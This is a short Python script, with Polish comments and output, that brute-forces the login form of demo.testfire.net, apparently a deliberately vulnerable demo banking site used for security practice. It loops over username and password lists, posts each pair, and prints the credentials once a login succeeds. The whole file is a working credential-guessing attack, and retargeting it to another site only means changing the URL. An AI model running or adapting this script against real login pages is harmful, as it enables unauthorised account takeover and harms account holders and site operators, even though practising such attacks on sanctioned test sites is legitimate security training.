import requests

# The API endpoint
url = "https://demo.testfire.net/doLogin"
session = requests.Session()
with open ("passwords.txt", "r") as f:
    passwd = f.readlines()

with open ("usernames.txt", "r") as f:
    login = f.readlines()
print ("Szukanie danych logowania:")
# Data to be sent
for password in passwd:
    password=password.strip()
    petla=True
    for username in login:
        username=username.strip()
        data = {
            "uid": f"{username}",
            "passw": f"{password}",
        }
        response = session.post(url, data=data)
        if response.url != "https://demo.testfire.net/login.jsp":
            print ("Logowanie udane")
            print (f"Login: {username}")
            print(f"Hasło {password}")
            petla=False
            break
    if not petla:
        break
